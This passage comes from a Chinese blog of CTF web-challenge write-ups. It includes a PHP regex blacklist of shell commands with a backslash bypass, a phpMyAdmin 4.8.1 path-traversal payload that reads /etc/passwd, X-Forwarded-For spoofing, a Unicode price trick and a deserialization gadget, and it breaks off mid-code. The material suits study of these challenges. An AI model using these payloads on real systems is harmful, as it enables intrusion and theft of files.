class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <span class="hljs-comment">//如果两个参数其中一个没被赋值</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-comment">//img解码</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-comment">//注意^，会正则匹配非大小写字母及数字和点，换成空格</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//大小写匹配flag</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//利用file_get_contents读目标文件内容，并使用base64加密</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<span class="hljs-comment">//一开始想的数组绕过即$a[]=1而且$b[]=2，不过他前面有个(string)强制类型转换(string(5) &quot;Array&quot;)，只能找碰撞绕过了。</span><br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<span class="hljs-comment">//注意反引号，执行命令的结构直接echo</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>最开始正则匹配<code>\</code>那里没弄明白，一开始觉得<code>|\\|\\\\|</code>这俩东西就会把<code>\</code>这东西给匹配了，去网上搜了wp发现都说直接<code>l\s</code>就能绕过。后面发现自己想错了，<code>|\\|\\\\|</code>这东西并不会匹配到<code>\</code>，需要<code>\\\</code>才行。举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到\\&#x27;</span>);<span class="hljs-comment">//一个反斜杠需要另一个反斜杠进行转义，这其实是一个反斜杠</span><br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时我们传<code>?b=</code>任何值都会报错：</p><p><code> **Warning**:  preg_match(): No ending delimiter &#39;/&#39; found in **D:\phpstudy_pro\WWW\wow.php** on line **4**</code></p><p>电脑没有找到<code>/</code>这个结束定界符。想了下原因，既然<code>\</code>这个东西是转义字符，那么<code>\\</code>只不过是一个转义后的<code>\</code>，这个东西和<code>/</code>组合到一起会去正则匹配<code>/</code>这个东西，这样一来导致缺少尾部界定符。修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\//i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时不会报错而且回去正则匹配<code>/</code>，现在思路就清晰了：如果我们想正则匹配<code>\</code>，那么就需要<code>\\\</code>才行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现在再看看这段正则匹配怎么个事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意<code>|\\|\\\\|</code>，这东西相当于去匹配<code>|\\\\</code>。因为前两个<code>\\</code>回去转义后面那个分隔符<code>|</code>，再加上<code>\\\\</code>，然后以<code>|</code>收尾：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们只有传<code>?b=|\\\\</code>才会<code>echo</code>检测到，所以我们仍可以利用<code>\</code>进行命令拼接，比如<code>l\s</code>，<code>l\s%20/</code>,<code>c\at%20fl\ag</code>等。</p><p>在burp中如果使用空格会被识别为其他的参数，所以这里空格用<code>%20</code>替换。</p><p>综上，可以进行命令执行，得到flag。</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="/img/db1.png" alt="db1"></p><p>???</p><p>用dirsearch扫一下，发现<code>robots.txt</code>还有<code>/phpmyadmin/</code>，看看都有啥：</p><p><code>robots.txt</code>提示<code>phpinfo.php</code>，<code>/phpmyadmin/</code>不登录可以直接访问数据库管理界面：</p><p><img src="/img/db2.png" alt="db2"></p><p>后面就无处下手了。。去网上查了一下<code>wp</code>，这题考的是<code>phpmyadmin4.8.1</code>版本存在任意文件读取漏洞:<code>include $_REQUEST[&#39;target&#39;];</code></p><p>直接利用现成的<code>payload</code>:<code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，发现可以进行任意文件读取。后面再翻翻<code>flag</code>的位置就行了。</p><p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code></p><p><code>flag&#123;14b071f4-a712-4a14-b3ce-d6bc07df4506&#125;</code></p><p>不过我看文章中都写了<code>$_REQUEST[&#39;target&#39;]</code>，但尝试<code>POST</code>提交拿不到结果。而且在<code>?target</code>前加个<code>/</code>就白屏了。。不过右键看源码还是能看到回显，不知道咋回事。</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>进环境发现有这么个东西：</p><p><img src="/img/flagpy1.png" alt="flagpy1"></p><p>看下源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>  hash = <span class="hljs-title function_">hex_md5</span>(code);<br>  <span class="hljs-keyword">return</span> hash;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> code = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;vcode&quot;</span>).<span class="hljs-property">value</span>;<span class="hljs-comment">//获取用户的输入</span><br>  <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">hex_md5</span>(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;./flag.php&quot;</span><span class="hljs-comment">//重定向到当前目录下的flag.php</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>看完想了一下，直接去<code>flag.php</code>看看怎么个事：</p><p><code>http://node4.buuoj.cn:25037/flag.php</code></p><p><img src="/img/flagpy2.png" alt="flagpy2"></p><p>提示保存了购买者的IP，可以利用<code>XFF</code>伪造。<code>除了购买者和我自己，没有人可以看到flag</code>，直接<code>XFF 127.0.0.1</code>试试？</p><p><img src="/img/flagpy3.png" alt="flagpy3"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>题目提示<code>unicode</code>和<code>python</code></p><p>了解了下<code>unicode</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unicode</span>是一种字符编码标准，用于表示文本中的字符。它为世界上几乎所有的字符都分配了一个唯一的数字标识，这个标识被称为<span class="hljs-string">&quot;码点&quot;</span>。Unicode的目标是为全球范围内的所有字符提供一个统一的编码方案，以解决不同国家和地区使用不同字符编码的问题。<br><br><span class="hljs-attribute">Unicode</span>使用十六进制表示每个字符的码点，例如字母<span class="hljs-string">&quot;A&quot;</span>的码点是U+<span class="hljs-number">0041</span>，汉字<span class="hljs-string">&quot;中&quot;</span>的码点是U+<span class="hljs-number">4</span>E2D。Unicode定义了超过<span class="hljs-number">130</span>,<span class="hljs-number">000</span>个码点，其中包括各种语言的字符、标点符号、符号、表情符号等。<br></code></pre></td></tr></table></figure><p><img src="/img/us1.png" alt="us1"></p><p>试了试购买前三种都提示：</p><p><img src="/img/unishop2.png" alt="unishop2"></p><p>买最后一个会显示:<code>Only one char(?) allowed!</code>，意思是这个<code>Price</code>只能填一个字符？源码里面有下面这段提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">meta charset=&quot;utf-8&quot;&gt;<span class="hljs-comment">&lt;!--Ah,really important,seriously. --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unicorn shop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Don&#x27;t be frustrated by the same view,we&#x27;ve changed the challenge content.--&gt;</span><br></code></pre></td></tr></table></figure><p>去网上找了下wp，和提示的<code>Unicode</code>有关：先把<code>Item ID</code>和<code>Price</code>都放空，看看报错信息：</p><p><img src="/img/unishop3.png" alt="unishop3"></p><p>可以发现他用了<code>unicodedata.numeric()</code>函数去处理这个<code>price</code>，这东西会获取 Unicode 字符的数值表示，比如：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; import unicodedata<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-number">1.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;11&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-number">3.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;33&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;𐄣&#x27;</span>)<br><span class="hljs-number">2000.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;万&#x27;</span>)<br><span class="hljs-number">10000.0</span><br></code></pre></td></tr></table></figure><p>然后利用这个网站<code>https://www.compart.com/en/unicode</code>找<code>numeric value</code>大于<code>1337</code>的就行</p><p><img src="/img/unishop4.png" alt="unishop4"></p><p>直接把目标符号复制粘贴到<code>Price</code>价格里就好了。</p><p>补充：这题源码里有段<code>price = urlib.unquote(price).decode(&#39;utf-8&#39;)</code>，即先把输入<code>url</code>解码后再经过<code>utf-8</code>编码赋值给<code>price</code>，然后用<code>unicodedata.numeric()</code>处理<code>price</code>。</p><p>所以可以通过先找目标字符的<code>utf-8</code>编码，把它转换成对应的<code>url</code>形式(把<code>0x</code>换成<code>%</code>就行，再去掉空格)</p><h2 id="网鼎杯-2020-朱雀组-Nmap-这题还没做完先放一放"><a href="#网鼎杯-2020-朱雀组-Nmap-这题还没做完先放一放" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap(这题还没做完先放一放)"></a>[网鼎杯 2020 朱雀组]Nmap(这题还没做完先放一放)</h2><p><img src="/img/nmap1.png" alt="nmap1"></p><p>一个端口扫描网站，初步猜测存在<code>RCE</code>或者文件包含。</p><p>先看源码里有啥：<code>&lt;!-- flag is in /flag --&gt;</code></p><p>嗯，那应该是要<code>RCE</code>了</p><p>随便输个<code>127.0.0.1</code>看看怎么个事：</p><p><img src="/img/namp2.png" alt="namp2"></p><p>提供了一些端口信息，这个<code>URL</code>值得注意：</p><p><code>/result.php?f=f7909</code></p><p><code>to index</code>就是返回首页，<code>to list</code>是这么个界面：</p><p><img src="/img/nmap3.png" alt="nmap3"></p><p><code>File</code>那一栏就是<code>result.php</code>底下的<code>f</code>参数，尝试了六次发现文件名应该五六位十六进制的随机数。他这东西的运行过程大概就是扫描目标<code>IP</code>的端口，然后给结果五位十六进制随机数的文件名，存储起来如果想读取利用<code>result.php</code>进行了文件包含。</p><p>不过结果中存在一个警告，抓包看看怎么个事：</p><p><img src="/img/nmap4.png" alt="nmap4"></p><p>首先，输入<code>IP</code>后会进行302重定向。</p><p>如果随便更改<code>f</code>的值呢？会出现下面的报错：</p><p><img src="/img/nmap5.png" alt="nmap5"></p><p>  <code>simplexml_load_file()</code>会把把XML 文档载入对象中，所以应该是把结果以XML文件的形式存储。</p><p><code>127.0.0.1;ls</code>提示<code>Host maybe down</code>，换成<code>127.0.0.1 ;</code>发现会给<code>;</code>前加一个<code>\</code>进行转义变成<code>127.0.0.1 \;</code>，但如果没有这个空格会直接报错<code>host maybe down</code></p><p>后面捣鼓半天不知道怎么弄了，找了<code>wp</code>发现是自己思路错了，这题考的是<code>Nmap</code>的一些用法。</p><p>还没做完先放一放。。一看这两个<code>escape</code>函数我就头疼</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>进环境发现是这么个东西，尝试右键看源码没啥反应，直接在URL加<code>view-source:</code></p><p><img src="/img/real1.png" alt="real1"></p><p>发现有这么个东西，直接访问：<code>./time.php?source</code>(本来还想拿dirsearch扫来着，看来没必要了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//相当于调用了b这个函数而且参数是a，可以通过这个执行命令</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))  <span class="hljs-comment">//若source被赋值，高亮源码并die(0)结束。后面要给data赋值</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<span class="hljs-comment">//反序列化GET传的data</span><br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">04</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">15</span><br><br><br><br></code></pre></td></tr></table></figure><p>现在思路就清晰了，直接构造我们想执行的命令就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 